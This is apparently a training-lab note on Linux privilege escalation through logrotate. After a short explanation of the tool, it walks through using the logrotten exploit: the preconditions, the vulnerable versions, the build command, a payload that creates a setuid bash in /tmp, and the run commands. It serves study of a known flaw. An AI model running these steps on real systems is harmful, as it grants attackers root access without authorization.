Every Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called `logrotate` takes care of archiving or disposing of old logs. If no attention is paid to log files, they become larger and larger and eventually occupy all available disk space. Furthermore, searching through many large log files is time-consuming. To prevent this and save disk space, `logrotate` has been developed. The logs in `/var/log` give administrators the information they need to determine the cause behind malfunctions. Almost more important are the unnoticed system details, such as whether all services are running correctly.

`Logrotate` has many features for managing these log files. These include the specification of:

- the `size` of the log file,
- its `age`,
- and the `action` to be taken when one of these factors is reached.
----------------
To exploit `logrotate`, we need some requirements that we have to fulfill.

1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

There is a prefabricated exploit that we can use for this if the requirements are met. This exploit is named [logrotten](https://github.com/whotwagner/logrotten). We can download and compile it on a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system.

Build exploit
```shell
logger@nix02:~$ gcc logrotten.c -o logrotten
```

Create a payload
```shell
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > payload
```

However, before running the exploit, we need to determine which option `logrotate` uses in `logrotate.conf`

```bash
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

Trigger logrotation by editing log file you have access to and can write to
```bash
echo test > /home/htb-student/backups/access.log
```

**IMMEDIATELY RUN EXPLOIT**
Create option
```bash
./logrotten -p ./payload /tmp/tmp.log
```

Compress option
```bash
./logrotten -p ./payload -c -s 4 /tmp/log/pwnme.log
```